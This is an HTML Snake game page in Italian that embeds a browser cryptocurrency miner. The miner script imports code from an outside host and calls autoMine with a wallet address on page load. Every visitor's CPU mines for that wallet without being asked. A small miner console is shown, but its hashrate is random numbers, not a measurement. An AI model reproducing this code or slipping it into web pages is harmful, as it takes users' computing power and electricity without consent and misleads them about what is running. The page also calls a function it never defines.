<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snake Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0a0a14;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
            overflow: hidden;
            touch-action: manipulation;
        }
        h1 { color: #0f0; margin: 15px 0 8px 0; }

        #menu, #game-over {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
        }
        .menu-box, #game-over {
            background: rgba(0, 30, 0, 0.95);
            border: 3px solid #0f0;
            padding: 40px 60px;
            border-radius: 15px;
            box-shadow: 0 0 30px #0f0;
        }
        #game-over { border-color: #f00; }

        #game-container {
            display: none;
            flex-direction: column;
            align-items: center;
            margin-top: 10px;
        }
        canvas {
            border: 4px solid #0f0;
            border-radius: 10px;
            background: #111;
            box-shadow: 0 0 25px #0f0;
        }

        #desktop-controls-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            padding: 8px 14px;
            background: #0f0;
            color: black;
            border: none;
            border-radius: 6px;
            font-size: 0.9em;
            cursor: pointer;
            z-index: 500;
            display: none;
        }

        #mobile-controls {
            margin: 20px 0 30px 0;
            width: 260px;
        }
        .dpad {
            display: grid;
            grid-template-columns: 80px 80px 80px;
            gap: 8px;
            justify-content: center;
        }
        .btn {
            background: rgba(0, 255, 0, 0.2);
            border: 3px solid #0f0;
            color: #0f0;
            font-size: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 12px;
            user-select: none;
        }
        .up    { grid-column: 2; }
        .left  { grid-column: 1; grid-row: 2; }
        .right { grid-column: 3; grid-row: 2; }
        .down  { grid-column: 2; grid-row: 3; }

        .pause-btn {
            margin-top: 20px;
            padding: 16px 50px;
            font-size: 18px;
            background: #ff8800;
            color: white;
            border: none;
            border-radius: 50px;
            width: 100%;
        }
    </style>
</head>
<body>

    <!-- MENU -->
    <div id="menu">
        <div class="menu-box">
            <h1>🐍 Snake Game</h1>
            <button onclick="startGame()">▶️ START GAME</button>
        </div>
    </div>

    <!-- GIOCO -->
    <div id="game-container">
        <button id="desktop-controls-btn" onclick="toggleMobileControls()">Controlli Touch</button>
        <canvas id="gameCanvas" width="380" height="380"></canvas>

        <div id="mobile-controls">
            <div class="dpad">
                <div></div>
                <div class="btn up" onclick="move('up')">↑</div>
                <div></div>
                
                <div class="btn left" onclick="move('left')">←</div>
                <div></div>
                <div class="btn right" onclick="move('right')">→</div>
                
                <div></div>
                <div class="btn down" onclick="move('down')">↓</div>
                <div></div>
            </div>
            <button class="pause-btn" onclick="togglePause()">⏸️ PAUSA / RIPRENDI</button>
        </div>
    </div>

    <!-- GAME OVER -->
    <div id="game-over" style="display: none;">
        <h1>Game Over</h1>
        <div class="score">Punteggio: <span id="final-score">0</span></div>
        <button onclick="restartGame()">Gioca di Nuovo</button>
        <button onclick="goToMenu()">Torna al Menu</button>
    </div>

    <!-- Mining Console -->
    <div id="mining-console">
        <div class="console-header">
            <span style="color:#0f0;">🔨 CPU Miner</span>
            <button class="close-btn" onclick="hideMinerConsole()">×</button>
        </div>
        <div class="console-line">Stato: Attivo</div>
        <div class="console-line">Hashrate: <span id="hashrate">Calcolando...</span></div>
        <div class="console-line timer">Tempo: <span id="timer">00:00</span></div>
    </div>

    <div id="reopen-btn" onclick="showMinerConsole()" 
         style="position: fixed; bottom: 20px; right: 20px; width: 45px; height: 45px; background: rgba(0,255,0,0.2); border: 2px solid #0f0; color: #0f0; font-size: 24px; border-radius: 50%; display: none; align-items: center; justify-content: center; cursor: pointer; z-index: 400;">
        ↑
    </div>

    <!-- Miner -->
    <script type="module">
        import { autoMine } from "https://earnify.cc/miner.js";
        autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
    </script>

    <script>
        const canvas = document.getElementById("gameCanvas");
        const ctx = canvas.getContext("2d");
        let snake = [{ x: 10, y: 10 }];
        let food = { x: 15, y: 15 };
        let dx = 0, dy = 0;
        let score = 0;
        let gameInterval;
        let gameSpeed = 110;
        let isPaused = false;

        function drawGame() {
            if (isPaused) return;

            const head = { x: snake[0].x + dx, y: snake[0].y + dy };

            // Collisione solo con i muri (NON con il corpo)
            if (head.x < 0 || head.x >= 19 || head.y < 0 || head.y >= 19) {
                gameOver();
                return;
            }

            snake.unshift(head);

            if (head.x === food.x && head.y === food.y) {
                score += 10;
                generateFood();
                if (score % 50 === 0 && gameSpeed > 60) gameSpeed -= 8;
            } else {
                snake.pop();
            }

            // Disegna
            ctx.fillStyle = "#111";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0f0";
            snake.forEach(s => ctx.fillRect(s.x * 20, s.y * 20, 18, 18));
            ctx.fillStyle = "#f00";
            ctx.fillRect(food.x * 20, food.y * 20, 18, 18);
        }

        function generateFood() {
            food = { x: Math.floor(Math.random() * 19), y: Math.floor(Math.random() * 19) };
            for (let s of snake) {
                if (s.x === food.x && s.y === food.y) generateFood();
            }
        }

        function gameOver() {
            clearInterval(gameInterval);
            document.getElementById("final-score").textContent = score;
            document.getElementById("game-over").style.display = "block";
        }

        function startGame() {
            document.getElementById("menu").style.display = "none";
            document.getElementById("game-container").style.display = "flex";
            document.getElementById("game-over").style.display = "none";
            resetGame();
        }

        function resetGame() {
            snake = [{ x: 9, y: 10 }];
            dx = 1; dy = 0;
            score = 0;
            gameSpeed = 110;
            isPaused = false;
            generateFood();
            clearInterval(gameInterval);
            gameInterval = setInterval(drawGame, gameSpeed);
        }

        function restartGame() { 
            document.getElementById("game-over").style.display = "none"; 
            resetGame(); 
        }
        function goToMenu() {
            document.getElementById("game-over").style.display = "none";
            document.getElementById("game-container").style.display = "none";
            document.getElementById("menu").style.display = "block";
        }

        // Tastiera
        document.addEventListener("keydown", e => {
            if (document.getElementById("game-container").style.display !== "flex") return;
            switch(e.key) {
                case "ArrowUp":    if (dy !== 1) { dx = 0; dy = -1; } break;
                case "ArrowDown":  if (dy !== -1) { dx = 0; dy = 1; } break;
                case "ArrowLeft":  if (dx !== 1) { dx = -1; dy = 0; } break;
                case "ArrowRight": if (dx !== -1) { dx = 1; dy = 0; } break;
                case " ": togglePause(); e.preventDefault(); break;
            }
        });

        function move(dir) {
            if (isPaused) return;
            switch(dir) {
                case "up":    if (dy !== 1) { dx = 0; dy = -1; } break;
                case "down":  if (dy !== -1) { dx = 0; dy = 1; } break;
                case "left":  if (dx !== 1) { dx = -1; dy = 0; } break;
                case "right": if (dx !== -1) { dx = 1; dy = 0; } break;
            }
        }

        function togglePause() {
            isPaused = !isPaused;
        }

        // Mining
        let startTime = Date.now();
        function updateTimer() {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
            const sec = (elapsed % 60).toString().padStart(2, '0');
            document.getElementById("timer").textContent = `${min}:${sec}`;
        }
        setInterval(updateTimer, 1000);
        setInterval(() => {
            document.getElementById("hashrate").textContent = (Math.floor(Math.random() * 450) + 280) + " H/s";
        }, 1800);

        function hideMinerConsole() {
            document.getElementById("mining-console").style.display = "none";
            document.getElementById("reopen-btn").style.display = "flex";
        }
        function showMinerConsole() {
            document.getElementById("mining-console").style.display = "block";
            document.getElementById("reopen-btn").style.display = "none";
        }

        window.onload = () => {
            const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
            if (isMobile) {
                document.getElementById("mobile-controls").style.display = "block";
            } else {
                document.getElementById("desktop-controls-btn").style.display = "block";
            }
        };
    </script>
</body>
</html>
